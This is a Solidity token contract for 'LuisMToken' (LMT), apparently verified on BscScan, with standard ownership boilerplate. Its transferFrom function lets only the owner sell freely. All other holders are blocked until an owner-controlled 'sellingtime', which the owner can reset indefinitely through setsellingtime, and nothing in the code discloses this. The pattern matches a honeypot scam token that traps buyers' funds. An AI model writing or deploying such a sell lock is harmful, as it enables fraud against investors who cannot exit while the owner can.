/**
 *Submitted for verification at BscScan.com on 2022-09-17
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


contract Luis is Ownable{

    // Variables
    string public name = "LuisMToken";
    string public symbol = "LMT";
    uint256 public sellingtime;
    uint256 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    // Events
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(address indexed burner, uint256 value);

    constructor(uint256 _time) {
        totalSupply = 30000 * (10 ** decimals);
        balanceOf[msg.sender] = totalSupply;
        sellingtime = _time;
    }

    function setsellingtime(uint256 _time) public onlyOwner {
        sellingtime = _time;
        
    }
  
    function burn(uint256 _value) public onlyOwner {
        _burn(msg.sender, _value);
        
    }
    function _burn(address _who, uint256 _value) internal {
        require(_value <= balanceOf[_who]);
        balanceOf[_who] = balanceOf[_who]-(_value);
        totalSupply = totalSupply -(_value);
        emit Burn(_who, _value);
        emit Transfer(_who, address(0), _value);
    
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);
        _transfer(msg.sender, _to, _value);
        return true;
    }


    function _transfer(address _from, address _to, uint256 _value) internal {
        require(_to != address(0));
        balanceOf[_from] = balanceOf[_from]-(_value);
        balanceOf[_to] = balanceOf[_to]+(_value);
        emit Transfer(_from, _to, _value);
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        require(_spender != address(0));
           allowance[msg.sender][_spender] = _value;
            emit Approval(msg.sender, _spender, _value);
            return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        if(_from == owner() || _from == address(this)){
            allowance[_from][msg.sender] = allowance[_from][msg.sender]-(_value);
        _transfer(_from, _to, _value);
        return true;
            
        }else{
                require(block.timestamp > sellingtime,'Error,Selling not started');
                 allowance[_from][msg.sender] = allowance[_from][msg.sender]-(_value);
                _transfer(_from, _to, _value);
                return true;
        }
        
    }
}